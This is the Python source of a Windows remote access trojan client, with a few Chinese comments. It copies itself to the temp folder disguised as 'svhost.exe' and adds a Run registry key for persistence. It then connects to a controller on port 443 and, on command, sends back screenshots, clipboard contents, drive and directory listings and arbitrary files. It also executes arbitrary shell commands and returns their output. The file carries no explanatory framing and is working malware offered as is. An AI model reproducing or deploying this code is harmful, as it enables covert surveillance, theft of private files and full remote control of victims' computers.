#coding:utf-8
import threading
import time
import socket
import traceback
import tempfile
import uuid
import os
import win32gui, win32ui, win32con, win32api
import win32clipboard as w
import win32con
import ctypes
import shutil
import sys
import struct

reload(sys)
sys.setdefaultencoding("utf-8")

ROOTPATH = os.getcwd()
EXEPATH = ROOTPATH + "/" + "video.exe"
try:
  temp_filepath = os.path.normpath(tempfile.gettempdir() + "/svhost.exe")
  shutil.copy(EXEPATH, temp_filepath)
  runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
  hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_ALL_ACCESS)
  win32api.RegSetValueEx(hKey, "MyTool", 0, win32con.REG_SZ, temp_filepath)
except:
    pass

host = ""
port = 443

def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('8.8.8.8',80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def send_content(sock, content):
    total_size = len(content)
    header = struct.pack("i", total_size)
    sock.send(header)
    sock.send(content)

def start():
    try:
        c_host = get_host_ip()
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host,port))
        #first connect, send helo info
        send_content(client,"HELO,"+c_host)
        while True:
            content = client.recv(1024)
            if content == 'snapshot':
                #截屏后，将屏幕图片回传给服务器
                tempfilename = snapshot()
                with open(tempfilename, "rb") as f:
                    content = f.read()
                    send_content(client,content)
                os.unlink(tempfilename)
            elif content == 'clipboard':
                clipboard_content = get_clipboard_content()
                send_content(client,clipboard_content)
            elif content == 'showdriver':
                drivers = get_drivers()
                send_content(client,drivers)
            elif content.startswith("getfilelist "):
                folder = " ".join(content.split(" ")[1:])
                try:
                    files = os.listdir(folder.strip())
                    flielist = []
                    for item in files:
                        if item not in ['.', '..']:
                            flielist.append(item.decode('GBK'))
                    send_content(client,"\n".join(flielist))
                except:
                    traceback.print_exc()
                    send_content(client,"folder %s doesn't exist"%(folder,))
            elif content.startswith("getfile "):
                file = " ".join(content.split(" ")[1:])
                file = file.decode("utf-8")
                if os.path.exists(file):
                    try:
                        with open(file, "rb") as f:
                            send_content(client,f.read())
                    except:
                        traceback.print_exc()
                        send_content(client,"file %s doesn't exist"%(file,))
                else:
                    send_content(client,"file %s doesn't exist"%(file,))
            elif content.startswith("cmd "):
                try:
                    cmd = " ".join(content.split(" ")[1:])
                    r = os.popen(cmd)
                    cmd_rtn = r.read()
                    r.close()
                    send_content(client,cmd_rtn)
                except:
                    send_content(client,"error")
            time.sleep(1)
    except:
        traceback.print_exc()
        time.sleep(5)
        start()

def get_drivers():
    lpBuffer = ctypes.create_string_buffer(78)
    ctypes.windll.kernel32.GetLogicalDriveStringsA(ctypes.sizeof(lpBuffer), lpBuffer)
    vol = lpBuffer.raw.split('\x00')
    drivers = list()
    for i in range(65,91):
        vol = chr(i) + ':'
        if os.path.isdir(vol):
            drivers.append(vol)
    return ' '.join(drivers)

def snapshot():
    hwnd = 0
    hwndDC = win32gui.GetWindowDC(hwnd)
    mfcDC = win32ui.CreateDCFromHandle(hwndDC)
    saveDC = mfcDC.CreateCompatibleDC()
    saveBitMap = win32ui.CreateBitmap()
    MoniterDev = win32api.EnumDisplayMonitors(None, None)
    w = MoniterDev[0][2][2]
    h = MoniterDev[0][2][3]
    saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
    saveDC.SelectObject(saveBitMap)
    saveDC.BitBlt((0, 0), (w, h), mfcDC, (0, 0), win32con.SRCCOPY)
    tempfilename = tempfile.gettempdir() + "/" + str(uuid.uuid1())
    saveBitMap.SaveBitmapFile(saveDC, tempfilename)
    return tempfilename

def get_clipboard_content():
    w.OpenClipboard()
    d = w.GetClipboardData(win32con.CF_TEXT)
    w.CloseClipboard()
    return d.decode('GBK')

if __name__ == '__main__':
    th = threading.Thread(target=start)
    th.start()